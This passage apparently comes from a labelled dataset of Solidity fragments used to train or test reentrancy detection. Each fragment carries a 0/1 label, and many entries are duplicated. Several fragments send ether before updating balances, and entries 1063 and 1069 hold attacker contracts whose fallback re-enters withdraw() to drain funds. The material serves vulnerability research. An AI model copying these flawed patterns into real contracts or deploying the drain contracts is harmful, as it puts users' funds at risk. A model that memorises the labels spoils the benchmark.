if (dateSaleStarted==0 || now < dateSaleStarted)
return _errorBuyingTokens("CrowdSale has not yet started.");
if (now > dateSaleEnded)
return _errorBuyingTokens("CrowdSale has ended.");
if (totalRaised >= hardCap)
return _errorBuyingTokens("HardCap has been reached.");
if (msg.value % 1000000000 != 0)
return _errorBuyingTokens("Must send an even amount of GWei.");
if (!wasSaleStarted) {
wasSaleStarted = true;
emit SaleStarted(now);
uint _amtToFund = (totalRaised + msg.value) > hardCap ? hardCap - totalRaised : msg.value;
uint _numTokens = getTokensFromEth(_amtToFund);
token.mint(msg.sender, _numTokens);
totalRaised += _amtToFund;
emit BuyTokensSuccess(now, msg.sender, _amtToFund, _numTokens);
if (totalRaised < softCap) {
amtFunded[msg.sender] += _amtToFund;
uint _refund = msg.value > _amtToFund ? msg.value - _amtToFund : 0;
if (_refund > 0){
require(msg.sender.call.value(_refund)());
emit UserRefunded(now, msg.sender, _refund);
function endSale() public
require(wasSaleStarted && !wasSaleEnded);
require(totalRaised >= hardCap || now > dateSaleEnded);
wasSaleEnded = true;
wasSoftCapMet = totalRaised >= softCap;
if (!wasSoftCapMet) {
token.mint(wallet, 1e30);
emit SaleFailed(now);
return;
token.freeze(false);
uint _lockerAmt = token.totalSupply() / 4;
token.mint(locker, _lockerAmt);
locker.startVesting(_lockerAmt, 600);
uint _capitalAmt = (totalRaised * capitalPctBips) / 10000;
if (address(this).balance < _capitalAmt) _capitalAmt = address(this).balance;
treasury.addCapital.value(_capitalAmt)();
if (wallet.call.value(address(this).balance)()) {}
emit SaleSuccessful(now);
function refund() public
require(wasSaleEnded && !wasSoftCapMet);
require(amtFunded[msg.sender] > 0);
uint _amt = amtFunded[msg.sender];
amtFunded[msg.sender] = 0;
require(msg.sender.call.value(_amt)());
emit UserRefunded(now, msg.sender, _amt);
function fundCapital() public payable
if (!wasSaleEnded)
return _errorBuyingTokens("Sale has not ended.");
if (!wasSoftCapMet)
return _errorBuyingTokens("SoftCap was not met.");
uint _amtNeeded = capitalFundable();
uint _amount = msg.value > _amtNeeded ? _amtNeeded : msg.value;
if (_amount == 0) {
return _errorBuyingTokens("No capital is needed.");
totalRaised += _amount;
token.mint(msg.sender, _amount);
treasury.addCapital.value(_amount)();
emit BuyTokensSuccess(now, msg.sender, _amount, _amount);
uint _refund = msg.value > _amount ? msg.value - _amount : 0;
if (_refund > 0) {
require(msg.sender.call.value(_refund)());
emit UserRefunded(now, msg.sender, _refund);
function _errorBuyingTokens(string _reason) private
require(msg.sender.call.value(msg.value)());
emit BuyTokensFailure(now, msg.sender, _reason);
function collectOwedDividends() public returns (uint _amount)
_updateCreditedPoints(msg.sender);
_amount = creditedPoints[msg.sender] / POINTS_PER_WEI;
creditedPoints[msg.sender] = 0;
dividendsCollected += _amount;
emit CollectedDividends(now, msg.sender, _amount);
require(msg.sender.call.value(_amount)());
function collect() public
require(msg.sender == owner);
token.collectOwedDividends();
uint _amount = address(this).balance;
if (_amount > 0) require(owner.call.value(_amount)());
emit Collected(now, owner, _amount);
0
---------------------------------
1054 740.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
require(_value > 0 && frozenAccount[msg.sender] == false && frozenAccount[_to] == false && now > unlockUnixTime[msg.sender]  && now > unlockUnixTime[_to]);
if (isContract(_to)) {
require(balanceOf[msg.sender] >= _value);
balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
balanceOf[_to] = balanceOf[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1055 14994.sol
function collectOwedDividends() public returns (uint _amount) {
_updateCreditedPoints(msg.sender);
_amount = creditedPoints[msg.sender] / POINTS_PER_WEI;
creditedPoints[msg.sender] = 0;
dividendsCollected += _amount;
emit CollectedDividends(now, msg.sender, _amount);
require(msg.sender.call.value(_amount)());
0
---------------------------------
1056 14758.sol
function wcf(address target, uint256 a) payable {
require(msg.sender == owner);
uint startBalance = this.balance;
target.call.value(msg.value)(bytes4(keccak256("play(uint256)")), a);
if (this.balance <= startBalance) revert();
owner.transfer(this.balance);
0
---------------------------------
1057 39190.sol
function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) {
if (self.accountBalances[accountAddress] >= value) {
deductFunds(self, accountAddress, value);
if (!accountAddress.send(value)) {
if (!accountAddress.call.value(value)()) {
throw;
return true;
return false;
uint constant DEFAULT_SEND_GAS = 100000;
function execute(Call storage self, uint start_gas, address executor, uint overhead, uint extraGas) public {
FutureCall call = FutureCall(this);
self.wasCalled = true;
if (self.abiSignature == EMPTY_SIGNATURE && self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)();
else if (self.abiSignature == EMPTY_SIGNATURE) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.callData);
else if (self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature);
else {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature, self.callData);
call.origin().call(bytes4(sha3("updateDefaultPayment()")));
uint gasScalar = getGasScalar(self.anchorGasPrice, tx.gasprice);
uint basePayment;
if (self.claimer == executor) {
basePayment = self.claimAmount;
else {
basePayment = call.basePayment();
uint payment = self.claimerDeposit + basePayment * gasScalar / 100;
uint donation = call.baseDonation() * gasScalar / 100;
self.claimerDeposit = 0;
uint gasCost = tx.gasprice * (start_gas - msg.gas + extraGas);
payment = sendSafe(executor, payment + gasCost);
donation = sendSafe(creator, donation);
CallExecuted(executor, gasCost, payment, donation, self.wasSuccessful);
event Cancelled(address indexed cancelled_by);
0
---------------------------------
1058 21697.sol
function Jump() public payable {
if(msg.value > 1 ether)  {
msg.sender.call.value(this.balance);
0
---------------------------------
1059 35806.sol
function withdraw(uint amount) {
require(tokens[0][msg.sender] >= amount);
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount);
require(msg.sender.call.value(amount)());
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
1060 40241.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
1061 8342.sol
function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyCommittee returns (bool) {
return _to.call.value(_value).gas(_gas)(_code);
0
---------------------------------
1062 dumbDAO.sol
function withdraw(address _recipient) returns (bool) {
if (balances[msg.sender] == 0){
InsufficientFunds(balances[msg.sender],balances[msg.sender]);
throw;
PaymentCalled(_recipient, balances[msg.sender]);
if (_recipient.call.value(balances[msg.sender])()) {
balances[msg.sender] = 0;
return true;
1
---------------------------------
1063 Bank.sol
function withdraw() {
require(msg.sender.call.value(balances[msg.sender])());
balances[msg.sender]=0;
contract Attacker{
address public bankAddr;
uint attackCount = 0;
constructor(address _bank){
bankAddr = _bank;
1
---------------------------------
1064 40090.sol
function multiAccessCallD(address _to, uint _value, bytes _data, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _to, _value, _data)) returns(bool) {
return _to.call.value(_value)(_data);
function() returns(bool) {
return multiAccessCall(multiAccessRecipient, msg.value, msg.data);
function multiAccessCall(address _to, uint _value, bytes _data) returns(bool) {
return this.multiAccessCallD(_to, _value, _data, msg.sender);
0
---------------------------------
1065 17043.sol
function withdraw() public {
msg.sender.call.value(balances[msg.sender])();
balances[msg.sender] = 0;
1
---------------------------------
1066 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
1067 39817.sol
function callDividend(address token_) owned {
assert(tokenManage[token_].hasDividend);
assert(tokenManage[token_].divContractAddress.call.value(0)(tokenManage[token_].divData));
function buyEther(uint256 amount) {
assert(valueToToken(etherContract,balances[msg.sender]) >= amount);
assert(destroyValue(msg.sender, tokenToValue(etherContract,amount)));
assert(msg.sender.call.value(amount)());
Buy(etherContract, msg.sender, amount, balances[msg.sender]);
function quickTrade(address tokenFrom, address tokenTo, uint256 input) payable drainBlock {
uint256 inValue;
uint256 tempInValue = safeAdd(tokenToValue(etherContract,msg.value),
tokenToValue(tokenFrom,input));
inValue = valueWithFee(tempInValue);
uint256 outValue = valueToToken(tokenTo,inValue);
assert(verifiedTransferFrom(tokenFrom,msg.sender,input));
if (tokenTo == etherContract){
assert(msg.sender.call.value(outValue)());
} else
assert(Token(tokenTo).transfer(msg.sender, outValue));
Trade(tokenFrom, tokenTo, msg.sender, inValue);
function takeEtherProfits(){
ShopKeeper(shopKeeperLocation).splitProfits();
ValueTrader shop = ValueTrader(shopLocation);
shop.buyEther(shop.balanceOf(this));
assert(profitContainerLocation.call.value(this.balance)());
0
---------------------------------
1068 21241.sol
function finish() onlyOwner saleCompletedSuccessfully public {
uint256 freeEthers = address(this).balance * 40 / 100;
uint256 vestedEthers = address(this).balance - freeEthers;
address(0xd1B10607921C78D9a00529294C4b99f1bd250E1c).transfer(freeEthers);
assert(address(0x0285d35508e1A1f833142EB5211adb858Bd3323A).call.value(vestedEthers)());
AuctusToken token = AuctusToken(auctusTokenAddress);
token.setTokenSaleFinished();
if (remainingTokens > 0) {
token.burn(remainingTokens);
remainingTokens = 0;
0
---------------------------------
1069 SimpleDAO.sol
function withdraw(uint amount) {
if (credit[msg.sender]>= amount) {
msg.sender.call.value(amount)();
credit[msg.sender]-=amount;
function getJackpot() {
owner.send(this.balance);
function() {
dao.withdraw(dao.queryCredit(this));
contract Mallory2 {
SimpleDAO public dao;
address owner;
bool public performAttack = true;
function attack()  {
dao.donate.value(1)(this);
dao.withdraw(1);
function getJackpot(){
dao.withdraw(dao.balance);
owner.send(this.balance);
performAttack = true;
function() {
if (performAttack) {
performAttack = false;
dao.withdraw(1);
function getJackpot(){
dao.withdraw(dao.balance);
owner.send(this.balance);
performAttack = true;
function() {
if (performAttack) {
performAttack = false;
dao.withdraw(1);
1
---------------------------------
1070 32605.sol
function forward(address destination, uint value, bytes data) public onlyOwner {
require(destination.call.value(value)(data));
Forwarded(destination, value, data);
contract MetaIdentityManager {
uint adminTimeLock;
uint userTimeLock;
uint adminRate;
address relay;
event LogIdentityCreated(address indexed identity, address indexed creator, address owner, address indexed recoveryKey);
event LogOwnerAdded(address indexed identity, address indexed owner, address instigator);
event LogOwnerRemoved(address indexed identity, address indexed owner, address instigator);
event LogRecoveryChanged(address indexed identity, address indexed recoveryKey,address instigator);
event LogMigrationInitiated(address indexed identity, address indexed newIdManager, address instigator);
event LogMigrationCanceled(address indexed identity, address indexed newIdManager, address instigator);
event LogMigrationFinalized(address indexed identity, address indexed newIdManager, address instigator);
mapping(address => mapping(address => uint)) owners;
mapping(address => address) recoveryKeys;
mapping(address => mapping(address => uint)) limiter;
mapping(address => uint) public migrationInitiated;
mapping(address => address) public migrationNewAddress;
modifier onlyAuthorized() {
require(msg.sender == relay || checkMessageData(msg.sender));
modifier onlyOwner(address identity, address sender) {
require(isOwner(identity, sender));
modifier onlyOlderOwner(address identity, address sender) {
require(isOlderOwner(identity, sender));
modifier onlyRecovery(address identity, address sender) {
require(recoveryKeys[identity] == sender);
modifier rateLimited(Proxy identity, address sender) {
require(limiter[identity][sender] < (now - adminRate));
limiter[identity][sender] = now;
modifier validAddress(address addr) {
require(addr != address(0));
function createIdentityWithCall(address owner, address recoveryKey, address destination, bytes data) public validAddress(recoveryKey) {
Proxy identity = new Proxy();
owners[identity][owner] = now - adminTimeLock;
recoveryKeys[identity] = recoveryKey;
LogIdentityCreated(identity, msg.sender, owner,  recoveryKey);
identity.forward(destination, 0, data);
function forwardTo(address sender, Proxy identity, address destination, uint value, bytes data) public onlyAuthorized onlyOwner(identity, sender){
identity.forward(destination, value, data);
0
---------------------------------
1071 22416.sol
function WithdrawToHolder(address _addr, uint _wei) public onlyOwner payable {
if(Holders[_addr]>0)  {
if(_addr.call.value(_wei)()){
Holders[_addr]-=_wei;
1
---------------------------------
1072 9920.sol
function tryExec(address target, bytes calldata, uint value) internal returns (bool call_ret){
return target.call.value(value)(calldata);
function exec(address target, bytes calldata, uint value) internal {
if(!tryExec(target, calldata, value)) {
throw;
function tryExec( address t, bytes c ) internal returns (bool) {
return tryExec(t, c, 0);
function tryExec( address t, uint256 v ) internal returns (bool) {
bytes memory c; return tryExec(t, c, v);
0
---------------------------------
1073 1403.sol
function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) {
_transfer( msg.sender, to, value, data );
if (isContract(to) ) {
ContractReceiver rx = ContractReceiver(to);
require(address(rx).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data));
return true;
function transfer(address to, uint256 value) public returns (bool success) {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
return true;
function transferFrom(address from, address to, uint256 value) public returns (bool success) {
require( value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer(from, to, value, empty);
return true;
function transfer(address to, uint value, bytes data) public returns (bool success) {
if (isContract(to)) {
return transferToContract(to, value, data);
_transfer(msg.sender, to, value, data );
return true;
function transferToContract(address to, uint value, bytes data) private returns (bool success) {
_transfer(msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
rx.tokenFallback( msg.sender, value, data );
return true;
1
---------------------------------
1074 simple_dao.sol
function withdraw(uint amount) public{
if (credit[msg.sender]>= amount) {
require(msg.sender.call.value(amount)());
credit[msg.sender]-=amount;
1
---------------------------------
1075 40118.sol
function withdrawEtherOrThrow(uint256 amount) private {
if (msg.sender != owner) throw;
bool result = owner.call.value(amount)();
if (!result) { throw;}
function refund() noEther onlyOwner {
if (tokenBalance == 0) throw;
tokenBalance = 0;
withdrawEtherOrThrow(tokenBalance * tokenPrice);
0
---------------------------------
1076 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1077 17518.sol
function sendTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
1078 21900.sol
function crowdsale() public payable returns (bool) {
require(msg.value >= limit);
uint256 vv = msg.value;
uint256 coin = crowdsalePrice.mul(vv);
require(coin.add(totalSupply) <= supplyLimit);
require(crowdsaleSupply.add(coin) <= crowdsaleTotal);
balances[msg.sender] = coin.add(balances[msg.sender]);
totalSupply = totalSupply.add(coin);
crowdsaleSupply = crowdsaleSupply.add(coin);
balances[msg.sender] = coin;
require(owner.call.value(msg.value)());
return true;
contract GGPCToken is Crowdsale {
string public name = "Global game payment currency";
string public symbol = "GGPC";
string public version = '1.0.2';
0
---------------------------------
1079 14945.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
0
---------------------------------
1080 33450.sol
function executeTransaction(bytes32 TransHash) public notExecuted(TransHash){
if (isConfirmed(TransHash)) {
Transactions[TransHash].executed = true;
require(Transactions[TransHash].destination.call.value(Transactions[TransHash].value)(Transactions[TransHash].data));
Execution(TransHash);
function confirmTransaction(bytes32 TransHash) public onlyOwner(){
addConfirmation(TransHash);
executeTransaction(TransHash);
0
---------------------------------
1081 40469.sol
function _forward(address _to, bytes _data) internal returns(bool) {
uint startGas = msg.gas + forwardCallGas + (_data.length * 50);
if (_to == 0x0) {
return false;
_to.call.value(msg.value)(_data);
return _applyRefund(startGas);
0
---------------------------------
1082 18170.sol
function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() {
require(_amount <= wingsETHRewards);
require(_contract.call.value(_amount)());
wingsETHRewards -= _amount;
0
---------------------------------
1083 40092.sol
function withdrawPayments() external returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) { throw; }
success = true;
0
---------------------------------
1084 4591.sol
function finishDistribution() onlyOwner canDistr public returns (bool) {
crowdsaleClosed = true;
uint256 amount = tokenReward.sub(amountRaisedIsc);
balances[beneficiary] = balances[beneficiary].add(amount);
emit Transfer(address(0), beneficiary, amount);
require(msg.sender.call.value(amountRaised)());
return true;
0
---------------------------------
1085 TokenWithInvariants.sol
function withdraw() checkInvariants {
uint balance = balanceOf[msg.sender];
if (msg.sender.call.value(balance)()) {
totalSupply -= balance;
balanceOf[msg.sender] = 0;
1
---------------------------------
1086 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1087 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1088 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1089 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1090 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1091 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1092 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1093 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1094 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1095 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1096 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1097 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1098 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
1099 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
1100 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
1101 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
1102 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
1103 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
1104 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
1105 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
1106 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
1107 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
1108 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
1109 36732.sol
function claim_bounty(){
if (this.balance < eth_minimum) return;
if (bought_tokens) return;
if (now < earliest_buy_time) return;
if (kill_switch) return;
